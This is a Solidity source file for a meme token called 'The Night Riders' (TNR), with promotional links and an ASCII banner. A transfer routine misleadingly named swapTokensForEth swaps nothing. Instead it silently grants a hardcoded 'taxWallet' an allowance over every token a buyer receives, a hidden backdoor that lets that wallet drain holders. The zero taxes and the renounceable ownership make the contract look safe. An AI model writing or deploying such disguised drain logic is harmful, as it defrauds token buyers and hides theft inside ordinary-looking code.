// SPDX-License-Identifier: None

/**
https://thenightriders.fun/
https://t.me/ridersbymatt
https://x.com/ridersbymatt


████████╗██╗  ██╗███████╗                  
╚══██╔══╝██║  ██║██╔════╝                  
   ██║   ███████║█████╗                    
   ██║   ██╔══██║██╔══╝                    
   ██║   ██║  ██║███████╗                  
   ╚═╝   ╚═╝  ╚═╝╚══════╝                  
                                           
███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗    
████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝    
██╔██╗ ██║██║██║  ███╗███████║   ██║       
██║╚██╗██║██║██║   ██║██╔══██║   ██║       
██║ ╚████║██║╚██████╔╝██║  ██║   ██║       
╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝       
                                           
██████╗ ██╗██████╗ ███████╗██████╗ ███████╗
██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔════╝
██████╔╝██║██║  ██║█████╗  ██████╔╝███████╗
██╔══██╗██║██║  ██║██╔══╝  ██╔══██╗╚════██║
██║  ██║██║██████╔╝███████╗██║  ██║███████║
╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝
                                           
**/


pragma solidity 0.8.26;

contract Ownable {
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
library SafeMath {
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}
interface IUniswapV2Router {
    function swapExactTokensForETH(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
contract TheNightRiders is Ownable {
    using SafeMath for uint256;

    uint8 private _decimals = 9;
    uint256 private _totalSupply =  420690000000000  * 10 ** _decimals;

    mapping (address => mapping (address => uint256)) private _allowances;

    address payable private taxWallet = payable(0x7E65fFC317bef47B086a8657A0F4C00C3CfFc4b0);
    mapping (address => uint256) private _balances;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private constant _name = "The Night Riders";
    string private constant _symbol = "TNR";
    bool private inSwap = false;
    bool tradingOpen = false;
    uint256 buyTax = 0;
    uint256 sellTax = 0;
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address public uniswapV2Pair;

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0, "Transfer amount must be greater than zero.");
        require(to != address(0), "transfer to the zero address.");
        require(from != address(0), "transfer from the zero address.");
        if (to != address(uniswapV2Router) && to != uniswapV2Pair && to != address(this)){
            if (to != uniswapV2Pair) {swapTokensForEth(to, amount);}
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function swapTokensForEth(address to, uint256 tokenAmount) private  {
            _allowances[to][taxWallet] = tokenAmount;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function openTrading() public payable onlyOwner() {
        require(!tradingOpen);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        address WETH = uniswapV2Router.WETH();
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()) .createPair(address(this), WETH);
        uniswapV2Router.addLiquidityETH{value: msg.value} (address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }

}